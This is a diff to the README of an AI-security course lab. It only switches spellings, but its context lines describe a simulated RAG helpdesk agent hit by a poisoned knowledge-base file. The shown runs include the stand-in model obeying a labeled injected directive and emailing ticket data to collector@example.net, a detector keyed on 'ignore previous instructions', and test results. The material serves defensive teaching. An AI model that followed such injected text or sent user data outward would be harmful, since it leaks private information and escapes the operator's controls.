@@ -65,7 +65,7 @@ Stay in the `ai-security-course-labs` folder: the first step below takes you int
 | `GUIDED-BUILD.md` | Step-by-step build in your own project (console and CLI/SDK), five requests, one change, teardown |
 | `test_lab.py`, `test_challenge.py`, `run_tests.py` | 24 tests for the lab, 6 for the challenge |
 
-**About the twins (read this).** None of them is Google's service. Each copies only the behaviour this lab depends
+**About the twins (read this).** None of them is Google's service. Each copies only the behavior this lab depends
 on, from Google's documentation and API definitions:
 
 - **RAG Engine** (`RagEngineTwin`): a corpus holds documents; `retrieveContexts` returns
@@ -79,7 +79,7 @@ on, from Google's documentation and API definitions:
   (`user_id`, `group_id`).
 - **Model Armor** (`ModelArmorTwin`): the `sanitizationResult` shape from GC12. Its detector is two regular
   expressions (the lab's injection marker and "ignore previous instructions"), nothing like Google's classifiers.
-- **ADK** (`adk_twin.py`): we checked the behaviours it copies against ADK 2.12.0 by running the real runtime offline
+- **ADK** (`adk_twin.py`): we checked the behaviors it copies against ADK 2.12.0 by running the real runtime offline
   (Step 6): plugin callbacks run before agent callbacks and the first non-`None` result wins; a tool with
   `require_confirmation` emits an `adk_request_confirmation` call and only runs after `{"confirmed": true}`, with
   `before_tool` callbacks running again after confirmation; the Model Armor plugin blocks on `MATCH_FOUND`, and on a
@@ -89,7 +89,7 @@ So the **shape** of every result and the **order** of every decision follow Goog
 **answers** are the stand-ins'. A real Gemini model may refuse an injected instruction that the stand-in obeys, or
 obey one the stand-in wouldn't. The controls you test here don't depend on the model's mood: that's the point.
 
-**About the data and safety.** Attack texts are labelled lab placeholders (`[LAB-INJECTED-DIRECTIVE: ...]`) aimed at
+**About the data and safety.** Attack texts are labeled lab placeholders (`[LAB-INJECTED-DIRECTIVE: ...]`) aimed at
 the local stand-in model. Staff are on `example.com`, customers on `example.org`, the attacker on `example.net`
 (all reserved for documentation, RFC 2606). The "confidential" deal code `CANARY-FIN-7731` is fake. Project numbers
 are placeholders. `send_email` appends to a Python list; nothing is sent. Test 24 fails if a real-looking address,
@@ -147,7 +147,7 @@ The documents, and the Cloud Storage buckets the import job reads them from:
     finance/pricing-2027.md        team finance  "Finance: 2027 hospital partner pricing (CONFIDENTIAL)"
   gs://example-kb-inbox   who may add files: group:all-engineers@example.com
     refund-policy-update.md        team all      "Refund policy update"
-                                   + one HTML comment with a labelled lab placeholder: hidden on a web page,
+                                   + one HTML comment with a labeled lab placeholder: hidden on a web page,
                                      plain text to a program
 
 team = a metadata tag on each file. Anyone who may add files to a bucket the import reads can put words
@@ -304,7 +304,7 @@ from a verified ID token, both writes waiting for a person, `controls.before_too
 **8. One turn, in ADK order.** Read it from the top:
 
 ```bash
-python3 explore.py turn today alice@example.com "Summarise ticket T-2042 for me."
+python3 explore.py turn today alice@example.com "Summarize ticket T-2042 for me."
 ```
 
 ```text
@@ -364,7 +364,7 @@ Real output (Linux, Python 3.13):
 
   HIGH    GC13-01  helpdesk-kb
           Per-user scope is a metadata filter chosen by model args: a metadata filter narrows the search, it
-          doesn't authorise it.
+          doesn't authorize it.
           fix: Pick corpora (or the filter) in your tool from the user's verified groups, never from model
                arguments.
   HIGH    GC13-02  helpdesk-kb
@@ -691,7 +691,7 @@ G4  bob@example.com: Please close ticket T-2041, the customer confirmed it is fi
     close_ticket returned {"status": "closed", "ticket_id": "T-2041"}
     answer: Done: closed.
 
-G5  alice@example.com: Summarise ticket T-2042 for me.
+G5  alice@example.com: Summarize ticket T-2042 for me.
     model calls get_ticket({"ticket_id": "T-2042"})
     get_ticket returned {"error": "Tool output was blocked by Model Armor."}
     answer: I couldn't do that: Tool output was blocked by Model Armor.
@@ -721,7 +721,7 @@ G3  alice@example.com: How do I get a refund for a customer?
     send_email returned {"error": "This tool call is rejected."}
     answer: I couldn't do that: This tool call is rejected.
 
-G5  alice@example.com: Summarise ticket T-2042 for me.
+G5  alice@example.com: Summarize ticket T-2042 for me.
     model calls get_ticket({"ticket_id": "T-2042"})
     get_ticket returned {"ticket_id": "T-2042", "customer": "ravi@example.org", "status": "open", "text": "C
     model calls send_email({"to": "collector@example.net", "ticket_id": "T-2042"})
@@ -791,7 +791,7 @@ Real output before you start:
 [PASS] hardened, but importing from the shared inbox again: only Model Armor stands between the poisoned file and the model
 [PASS] terraform: corpus per audience, optional CMEK, a dedicated agent account, Model Armor template
 [PASS] adk_agent: no scope argument for the model, confirmation on both writes, tool output screened
-[PASS] safety: only documentation domains, placeholder project numbers, no keys, labelled attack text
+[PASS] safety: only documentation domains, placeholder project numbers, no keys, labeled attack text
 [FAIL] challenge: during an outage, the injected email (R5) is blocked by before_tool, no approval requested
 [FAIL] challenge: an email to the ticket's own customer still reaches the approval step (not over-blocked)
 [FAIL] challenge: during an outage, no ticket or document text reaches the model unscreened (fail closed)
@@ -842,7 +842,7 @@ Real output:
 [PASS] hardened, but importing from the shared inbox again: only Model Armor stands between the poisoned file and the model
 [PASS] terraform: corpus per audience, optional CMEK, a dedicated agent account, Model Armor template
 [PASS] adk_agent: no scope argument for the model, confirmation on both writes, tool output screened
-[PASS] safety: only documentation domains, placeholder project numbers, no keys, labelled attack text
+[PASS] safety: only documentation domains, placeholder project numbers, no keys, labeled attack text
 
 ALL TESTS PASSED (24 run)
 ```
